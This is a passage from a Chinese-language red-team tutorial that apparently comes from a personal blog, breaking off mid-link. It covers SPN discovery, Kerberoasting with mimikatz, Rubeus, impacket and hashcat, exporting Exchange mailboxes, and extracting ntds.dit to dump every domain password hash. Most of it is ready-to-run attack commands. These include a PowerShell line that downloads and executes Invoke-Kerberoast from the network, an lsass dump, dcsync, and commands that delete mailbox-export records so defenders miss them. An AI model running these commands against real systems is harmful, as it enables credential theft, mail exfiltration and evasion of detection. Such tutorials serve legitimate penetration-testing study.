title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p><p>PowerShellery 下载地址：<a href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search *或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果也可以转换为表格的形式，以便于浏览</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search * -List yes或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1Get-DomainSpn或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906144640.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p><p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p><p>kerberoast 的利用思路：</p><p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p><p>2、请求并导出 TGS</p><p>3、对 TGS 进行爆破</p><p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p><p>手动注册 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户所对应的 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p><p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p><p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请求指定 SPN 的服务票据</p><pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者请求所有服务的服务票据</p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p><p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 Rubeus 获取票据</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 impacket 获取票据</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p><p>Kerberoast 脚本下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">python tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113300.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x25-Exchange-邮件服务器"><a href="#0x25-Exchange-邮件服务器" class="headerlink" title="0x25 Exchange 邮件服务器"></a>0x25 Exchange 邮件服务器</h1><h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote><p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p></blockquote><p>将 Exchange 管理单元添加到当前会话中</p><pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看邮件数据库</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据库的物理路径</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取现有用户的邮件地址</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定用户的邮箱使用信息</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户邮箱中的邮件数量，通过该命令还可以列出那些用户未登录过邮箱</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出指定的电子邮箱"><a href="#2、导出指定的电子邮箱" class="headerlink" title="2、导出指定的电子邮箱"></a>2、导出指定的电子邮箱</h2><p>Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p><p>如果想要导出 PTS 格式的邮件文件，则需要为用户配置导出/导出权限。</p><h3 id="配置用户的导入导出权限"><a href="#配置用户的导入导出权限" class="headerlink" title="配置用户的导入导出权限"></a>配置用户的导入导出权限</h3><p>查看用户权限</p><pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p><pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除刚刚添加的 Mailbox Import Export 角色组中的用户</p><pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h3><p>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范）路径下</p><p>类似于 “\hostname\sharename”、“\ipaddress\sharename” 的网络路径下，sharename 为网络共享名称。</p><p>首先开启共享，将 C 盘 inetpub 文件夹设置为 everyone 可读写，执行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h3><p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p><pre class="line-numbers language-none"><code class="language-none">New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用图形化界面导出电子邮件，访问 <a href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p><p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908104558.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将指定用户已经完成的导出请求删除</p><pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已完成的导出请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有导出请求，包括完成和失败的请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x26-ntds-dit-的提取与散列值导出"><a href="#0x26-ntds-dit-的提取与散列值导出" class="headerlink" title="0x26 ntds.dit 的提取与散列值导出"></a>0x26 ntds.dit 的提取与散列值导出</h1><h2 id="0、前言-6"><a href="#0、前言-6" class="headerlink" title="0、前言"></a>0、前言</h2><p>在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\ntds.dit</p><p>ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash</p><p>在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。</p><p>不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）</p><h2 id="1、使用卷影拷贝服务提取-ntds-dit"><a href="#1、使用卷影拷贝服务提取-ntds-dit" class="headerlink" title="1、使用卷影拷贝服务提取 ntds.dit"></a>1、使用卷影拷贝服务提取 ntds.dit</h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h3><p>ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。</p><p>该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载刚刚创建的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 copy 命令将快照中的文件复制到 C 盘下</p><pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除之前加载的快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; &quot;delete &#123;ce2f5901-022f-4c21-b266-b4c14db67749&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询当前系统中的快照，可以看到没有任何快照</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908135855.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h3><p>vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。</p><p>vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在创建的卷影拷贝中将 ntds.dit 复制出来</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除快照</p><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908145721.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h3><p>vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。</p><p>vssown.vbs 下载地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>启动卷影拷贝服务</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个 C 盘的卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出当前卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除卷影拷贝</p><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs &#x2F;delete &#123;22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908152359.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit</p><p>在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>在域控中以管理员模式打开命令行环境，输入命令</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下</p><p>将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除</p><pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Copy-VSS.ps1Copy-vss或者PowerShell -Exec bypass -C &quot;Import-module .\Copy-VSS.ps1;Copy-vss&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。</p><h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a>diskshadow</h3><p>diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。</p><blockquote><p>diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作</p></blockquote><p>首先创建一个 txt 文件，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;C:\windows\system32\cmd.exe&quot; &#x2F;c copy k:\Windows\NTDS\ntds.dit C:\ntds.ditdelete shadows alllist shadows allresetexit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 diskshadow 调用刚才的文本文件</p><pre class="line-numbers language-none"><code class="language-none">diskshadow &#x2F;s C:\command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><pre class="line-numbers language-none"><code class="language-none">reg save hklm\system c:\windows\temp\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-NinjaCopy-ps1"><a href="#Invoke-NinjaCopy-ps1" class="headerlink" title="Invoke-NinjaCopy.ps1"></a>Invoke-NinjaCopy.ps1</h3><p>PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><p>PowerSploit 工具包项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket 安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacketpython3 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出-ntds-dit-文件中的散列值"><a href="#2、导出-ntds-dit-文件中的散列值" class="headerlink" title="2、导出 ntds.dit 文件中的散列值"></a>2、导出 ntds.dit 文件中的散列值</h2><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>安装 esedbexport，以 Kali 为例</p><pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-configwget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20210424&#x2F;libesedb-experimental-20210424.tar.gztar zxvf libesedb-experimental-20210424.tar.gzcd libesedb-20210424.&#x2F;configuremakemake installldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 ntdsxtract</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.gitcd ntdsxtractpython setup.py buildpython setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里</p><pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export&#x2F;datatable.3 ntds.dit.export&#x2F;link_table.5 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee all_user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908171420.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内</p><pre class="line-numbers language-none"><code class="language-none">python2 dscomputers.py ntds.dit.export&#x2F;datatable.3 computer_output --csvoutfile all_computers.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中</p><pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接使用 python 执行 secretsdump.py 文件</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p><p>导出域内所有用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出域内指定用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过转储 lsass.exe 进行 dump 操作</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p></blockquote><h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p><p>Invoke-DCSync.ps1 下载地址：<a 